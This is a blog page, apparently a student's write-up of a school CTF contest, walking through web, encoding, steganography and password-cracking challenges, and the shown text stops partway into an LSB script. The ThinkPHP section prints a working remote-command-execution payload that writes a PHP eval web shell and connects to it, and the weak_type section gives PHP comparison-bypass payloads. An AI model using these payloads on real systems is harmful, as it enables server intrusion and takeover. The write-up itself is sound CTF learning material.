@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"oneyolo.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+
+  <meta name="description" content="校赛writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="校赛writeup">
+<meta property="og:url" content="http://oneyolo.github.io/2020/11/28/%E6%A0%A1%E8%B5%9Bwriteup/index.html">
+<meta property="og:site_name" content="yolo的博客">
+<meta property="og:description" content="校赛writeup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128200631110.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128201247698.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/output.gif">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128201713104.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128210129813.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128211941287.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128212419959.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128212814094.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128213440615.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128213921232.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128214307454.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128220123260.png">
+<meta property="og:image" content="http://oneyolo.github.io/images/image-20201128220326397.png">
+<meta property="article:published_time" content="2020-11-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-29T14:20:10.512Z">
+<meta property="article:author" content="yolo">
+<meta property="article:tag" content="misc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://oneyolo.github.io/images/image-20201128200631110.png">
+
+
+<link rel="canonical" href="http://oneyolo.github.io/2020/11/28/%E6%A0%A1%E8%B5%9Bwriteup/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>校赛writeup | yolo的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">yolo的博客</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">不忘初心，方得始终</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%A1%E8%B5%9Bwriteup"><span class="nav-number">1.</span> <span class="nav-text">校赛writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-weak-type"><span class="nav-number">1.1.</span> <span class="nav-text">1.weak_type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#thinkphp"><span class="nav-number">1.2.</span> <span class="nav-text">thinkphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fungame"><span class="nav-number">1.3.</span> <span class="nav-text">fungame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleQrcode"><span class="nav-number">1.4.</span> <span class="nav-text">SimpleQrcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Check-In"><span class="nav-number">1.5.</span> <span class="nav-text">Check In</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fakezip"><span class="nav-number">1.6.</span> <span class="nav-text">fakezip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Base-family"><span class="nav-number">1.7.</span> <span class="nav-text">Base family</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SlientEye"><span class="nav-number">1.8.</span> <span class="nav-text">SlientEye</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E4%B9%8B%E7%8E%8B"><span class="nav-number">1.9.</span> <span class="nav-text">编码之王</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Collision"><span class="nav-number">1.10.</span> <span class="nav-text">Collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARCHPR"><span class="nav-number">1.11.</span> <span class="nav-text">ARCHPR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#outguess"><span class="nav-number">1.12.</span> <span class="nav-text">outguess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSTV"><span class="nav-number">1.13.</span> <span class="nav-text">SSTV</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yolo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/oneyolo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;oneyolo" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2458868647@qq.com" title="E-Mail → mailto:2458868647@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://macshuo.com/" title="http:&#x2F;&#x2F;macshuo.com&#x2F;" rel="noopener" target="_blank">MacTalk</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://example.com/" title="http:&#x2F;&#x2F;example.com&#x2F;" rel="noopener" target="_blank">Title</a>
+        </li>
+    </ul>
+  </div>
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://oneyolo.github.io/2020/11/28/%E6%A0%A1%E8%B5%9Bwriteup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yolo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yolo的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          校赛writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-11-28 00:00:00" itemprop="dateCreated datePublished" datetime="2020-11-28T00:00:00+08:00">2020-11-28</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-11-29 22:20:10" itemprop="dateModified" datetime="2020-11-29T22:20:10+08:00">2020-11-29</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="校赛writeup"><a href="#校赛writeup" class="headerlink" title="校赛writeup"></a>校赛writeup</h1><a id="more"></a>
+
+<h2 id="1-weak-type"><a href="#1-weak-type" class="headerlink" title="1.weak_type"></a>1.weak_type</h2><p>首先是get型数据，num用 ‘?num=XXX’形式提交，发现关键函数intval($num,0)，.intval()的返回值是整型，所以可以利用202020020.1，加小数位，然后intval()将它变为整数，完成level 1</p>
+<p>第二步，关键在这一句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($v1 !&#x3D; $v2 &amp;&amp; md5($v1)&#x3D;&#x3D;md5($v2))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>利用特殊的v1，v2 值，v1=240610708    v2=QNKCDZO</p>
+<p>md5(‘240610708’)==md5(‘QNKCDZO’); //True </p>
+<p>md5(‘240610708’)===md5(‘QNKCDZO’); //False</p>
+<p>同时还可以利用md5不能处理数组来绕过，</p>
+<p>?v1[]=1&amp;v2[]=2</p>
+<p>完成level 2</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;202020020.1&amp;v1&#x3D;240610708&amp;v2&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure>
+
+<p>第三步，if ($message-&gt;key == $key)</p>
+<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过</p>
+<p>message={“key”:0}</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;202020020.1&amp;v1&#x3D;240610708&amp;v2&#x3D;QNKCDZO &#x2F;&#x2F;get提交</span><br><span class="line">message&#x3D;&#123;&quot;key&quot;:0&#125; &#x2F;&#x2F;post提交</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h2><p>看到ThinkPHP V5 ，直接查询这个版本的php有什么漏洞，查到是远程命令执行，</p>
+<p>还查到一篇博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45949219/article/details/104334715">https://blog.csdn.net/weixin_45949219/article/details/104334715</a></p>
+<p>利用post传参，打入payload</p>
+<p>/index.php?s=captcha</p>
+<p>使用phpinfo函数验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;phpinfo&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;1  &#x2F;&#x2F;post提交</span><br></pre></td></tr></table></figure>
+
+<p>将一句话木马写入shell2.php</p>
+<p>echo “<?php @eval($_POST['xss']);?>” &gt;shell.php</p>
+<p>由于连接失败，使用base64编码</p>
+<p>/index.php?s=captcha</p>
+<p>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo -n YWFhPD9waHAgQGFzc2VydCgkX1BPU1RbJ3hzcyddKTs/PmJiYg== | base64 -d &gt; shell9.php</p>
+<p>使用蚁剑连接，注意Encode要使用chr或者base64</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;captcha   &#x2F;&#x2F;get</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo -n YWFhPD9waHAgQGFzc2VydCgkX1BPU1RbJ3hzcyddKTs&#x2F;PmJiYg&#x3D;&#x3D; | base64 -d &gt; shell.php  &#x2F;&#x2F;post提交</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑网址栏填入</p>
+<p><a target="_blank" rel="noopener" href="http://dmctf.vaala.cloud:28254/shell.php">http://dmctf.vaala.cloud:28254/shell.php</a></p>
+<p>密码：XSS </p>
+<p>打开虚拟终端，输入linux下查询所有环境变量的命令:  env  。看到flag</p>
+<h2 id="fungame"><a href="#fungame" class="headerlink" title="fungame"></a>fungame</h2><p>js小游戏，</p>
+<p><img src="/images/image-20201128200631110.png" alt="image-20201128200631110"></p>
+<p>这一句和下一句都是判断是不是最后一关，直接改成10，ctrl+s,保存，去第一关死一次，按Esc复活,然后进下一关就是第十关，<img src="/images/image-20201128201247698.png" alt="image-20201128201247698"></p>
+<p>改一下血量，飞镖数，然后站着打就行</p>
+<h2 id="SimpleQrcode"><a href="#SimpleQrcode" class="headerlink" title="SimpleQrcode"></a>SimpleQrcode</h2><p><img src="/images/output.gif"></p>
+<p>gif二维码，用</p>
+<p><img src="/images/image-20201128201713104.png" alt="image-20201128201713104"></p>
+<p>打开, 帧查看，手机扫码，得出flag</p>
+<h2 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a>Check In</h2><p>签到题，输入flag</p>
+<h2 id="fakezip"><a href="#fakezip" class="headerlink" title="fakezip"></a>fakezip</h2><p>没有密码提示，爆破跑了10分钟，无解，查询题目，好像是伪加密。</p>
+<p><img src="/images/image-20201128210129813.png" alt="image-20201128210129813"></p>
+<p>这两个是加密位，第一个是全局加密标志位，第二个是文件加密标志位，全改为00，直接解压。</p>
+<p>得到一串音符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>查询音符密码解密，</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</a></strong></p>
+<h2 id="Base-family"><a href="#Base-family" class="headerlink" title="Base family"></a>Base family</h2><p>查询的是base编码，并且提示是base64,base16,base32……….全是base，</p>
+<p>查询有点像base91,用这个网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.dcode.fr&#x2F;base-91-encoding</span><br></pre></td></tr></table></figure>
+
+<p>然后把转码后的base编码放这个工具里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.110.142.202&#x2F;tools&#x2F;CyberChef&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>然后一个一个试一下，或使用<img src="/images/image-20201128211941287.png" alt="image-20201128211941287">自动识别base编码。</p>
+<p>拿到flag</p>
+<h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><p>查询题目知道这是一个加密软件</p>
+<p><img src="/images/image-20201128212419959.png" alt="image-20201128212419959"></p>
+<p>下载下来，图片拖进去直接Encode,保存flag.txt ,得到</p>
+<p>一串unicode编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#110;&amp;#49;&amp;#95;&amp;#98;&amp;#117;&amp;#95;&amp;#106;&amp;#49;&amp;#97;&amp;#110;&amp;#103;&amp;#95;&amp;#119;&amp;#117;&amp;#95;&amp;#100;&amp;#51;&amp;#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件后缀改成html ,浏览器打开，<img src="/images/image-20201128212814094.png" alt="image-20201128212814094"></p>
+<p>得到flag</p>
+<h2 id="编码之王"><a href="#编码之王" class="headerlink" title="编码之王"></a>编码之王</h2><p>下载打开全是社会主义核心价值观，利用编码网站解码，</p>
+<p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/cvencode.html">http://ctf.ssleye.com/cvencode.html</a></p>
+<p>拿到一堆 与佛论禅 的编码</p>
+<p>继续解码 <a target="_blank" rel="noopener" href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
+<p>拿到 新佛曰 的编码</p>
+<p>继续解码 <a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
+<p>拿到 jsfuck编码</p>
+<p>直接放进浏览器控制窗口，运行，</p>
+<img src="/images/image-20201128213440615.png" alt="image-20201128213440615" style="zoom: 80%;">
+
+<h2 id="Collision"><a href="#Collision" class="headerlink" title="Collision"></a>Collision</h2><p>CRC32碰撞，</p>
+<p>网上查询crc32碰撞脚本，找到一个好用的，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc</span>(<span class="params">_crc</span>):</span></span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    dic = string.printable</span><br><span class="line">    _input = _crc</span><br><span class="line">    _input = <span class="string">&quot;0X&quot;</span> + _input</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + n + h + m</span><br><span class="line">                    s = s.encode()</span><br><span class="line">                    <span class="comment"># print(str(binascii.crc32(s)), _input)</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hex</span>(binascii.crc32(s)).upper() == _input.upper():</span><br><span class="line">                        print(_crc, <span class="string">&#x27;:&#x27;</span>, s.decode())</span><br><span class="line">                        print(l)</span><br><span class="line">                        sys.exit()  <span class="comment">#直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复</span></span><br><span class="line">                    l = l + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc32</span>():</span></span><br><span class="line">    print(<span class="string">&quot;四字节碰撞!!!&quot;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你可能需要多个线程同时进行碰撞，请输入线程数：&quot;</span>))</span><br><span class="line">    _thread = []</span><br><span class="line">    _args = []</span><br><span class="line">    print(<span class="string">&quot;输入参数&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        print(i+<span class="number">1</span>, end=<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        _args.append(<span class="built_in">input</span>())</span><br><span class="line">    <span class="comment"># print(_args)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        t = threading.Thread(target=crc, args=(_args[i],))</span><br><span class="line">        _thread.append(t) <span class="comment">#如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试</span></span><br><span class="line">    <span class="comment"># print(_thread)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        _thread[i].join()</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crc32()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20201128213921232.png" alt="image-20201128213921232"></p>
+<img src="/images/image-20201128214307454.png" alt="image-20201128214307454" style="zoom: 80%;">
+
+<p>手动拼接一下，拿到flag</p>
+<h2 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h2><p>题目：This file was encrypted by me with a four-digit password, try to crack it!</p>
+<p>直接使用 ARCHPR 软件密码爆破，四位数字，拿到密码，hint.txt提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase.</span><br><span class="line"></span><br><span class="line">key: .--. .- ... ... .-- --- .-. -..</span><br><span class="line">password</span><br></pre></td></tr></table></figure>
+
+<p>key是明显的摩斯密码，解码为：PASSWORD，它提示转为小写，所以是password</p>
+<p>查询LSB隐写，查lsb解码脚本，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 